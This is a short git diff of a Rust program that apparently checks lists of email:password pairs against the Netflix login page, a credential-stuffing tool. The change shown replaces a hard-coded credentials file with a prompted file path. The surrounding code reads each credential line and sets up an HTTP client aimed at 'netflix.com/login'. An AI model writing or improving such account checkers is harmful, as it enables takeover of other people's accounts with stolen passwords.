@@ -4,6 +4,17 @@ use std::fs::File;
 use std::io::{self, BufRead};
 use std::path::Path;
 
+fn ask_string(message: &str) -> String {
+    println!("{}", message);
+    let stdin = io::stdin();
+    let mut line = String::new();
+    stdin
+        .lock()
+        .read_line(&mut line)
+        .expect("Failed to read line");
+    line.trim().to_string()
+}
+
 fn extract(word: &str) -> (String, String) {
     let mut parts = word.splitn(2, ':');
     let email = parts.next().unwrap_or_default().to_string();
@@ -23,7 +34,9 @@ where
 async fn main() -> Result<(), Error> {
     let url = "https://www.netflix.com/login";
     
-    if let Ok(lines) = read_lines("./creditentials.txt") {
+    let path = ask_string("Enter the cretidentials file path : ");
+
+    if let Ok(lines) = read_lines(path) {
         let client = Client::new();
 
         for line in lines.flatten() {
